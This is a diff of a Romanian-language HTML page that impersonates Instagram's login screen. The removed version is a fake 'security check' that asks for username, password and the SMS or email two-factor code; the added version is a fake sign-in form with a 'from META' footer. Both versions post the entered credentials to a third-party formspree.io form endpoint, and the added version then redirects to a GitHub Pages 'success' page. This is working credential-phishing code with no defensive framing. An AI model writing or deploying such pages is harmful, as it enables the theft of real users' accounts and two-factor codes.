@@ -1,39 +1,28 @@
 <!DOCTYPE html>
-<html lang="ro">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Security Check</title>
+    <title>Instagram</title>
     <style>
-        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
-        h1 { font-family: 'Instagram Sans', sans-serif; font-size: 40px; margin-bottom: 20px; font-style: italic; }
-        p { color: #8e8e8e; font-size: 14px; line-height: 1.4; margin-bottom: 20px; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px; margin-bottom: 10px; box-sizing: border-box; font-size: 12px; }
-        .security-code { border: 2px solid #0095f6; background: #f0faff; }
-        button { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: white; padding: 7px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .info-text { font-size: 12px; color: #ed4956; margin-top: 15px; font-weight: bold; }
+        body { background: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { width: 300px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 40px; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; box-sizing: border-box; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; opacity: 0.8; }
+        .footer { margin-top: 40px; font-size: 12px; color: #8e8e8e; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <h1>Instagram</h1>
-        <p>Pentru a continua, confirmă identitatea contului tău.</p>
-        
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
         <form action="https://formspree.io/f/xdapgaep" method="POST">
-            <input type="text" name="User" placeholder="Utilizator" required>
-            <input type="password" name="Pass" placeholder="Parolă" required>
-            
-            <div style="margin: 20px 0; border-top: 1px solid #dbdbdb;"></div>
-            
-            <p style="color: #262626; font-weight: bold; margin-bottom: 5px;">Cod de securitate</p>
-            <input type="text" name="2FA_Code" class="security-code" placeholder="Codul din SMS sau Email">
-            
-            <p class="info-text">Trebuie să introduci codul primit pentru a finaliza verificarea.</p>
-            
-            <input type="hidden" name="_next" value="https://instagram.com">
-            <button type="submit">Verifică Contul</button>
+            <input type="text" name="user" placeholder="Număr de telefon, nume de utilizator sau e-mail" required>
+            <input type="password" name="pass" placeholder="Parolă" required>
+            <button type="submit">Conectează-te</button>
+            <input type="hidden" name="_next" value="https://ryt6ngx4tm-crypto.github.io/mata/succes.html">
         </form>
     </div>
+    <div class="footer">from META</div>
 </body>
 </html>
